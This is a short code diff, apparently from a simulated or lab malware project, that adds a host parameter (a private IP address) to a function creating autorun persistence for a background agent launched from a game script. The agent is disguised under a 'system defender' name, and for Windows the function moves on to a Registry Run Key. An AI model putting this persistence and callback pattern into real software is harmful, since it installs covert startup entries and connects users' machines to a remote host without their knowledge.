@@ -7,7 +7,7 @@ from typing import Tuple
 SIMULATED_STARTUP_DIR = Path(__file__).resolve().parent / "simulated_startup"
 PERSISTENCE_MARKER = SIMULATED_STARTUP_DIR / "system_defender_autorun.txt"
 
-def create_persistence() -> Tuple[bool, Path]:
+def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]:
     """Create a persistent background process using platform-specific methods."""
     SIMULATED_STARTUP_DIR.mkdir(parents=True, exist_ok=True)
     
@@ -19,7 +19,7 @@ def create_persistence() -> Tuple[bool, Path]:
         exe_path = f'"{sys.executable}" "{Path(__file__).resolve().parent.parent / "game" / "main_game.py"}"'
     
     # Platform-specific command for the agent
-    agent_cmd = f'{exe_path} --bg'
+    agent_cmd = f'{exe_path} --bg --host {host}'
     
     # 1. Windows: Registry Run Key
     if sys.platform == "win32":
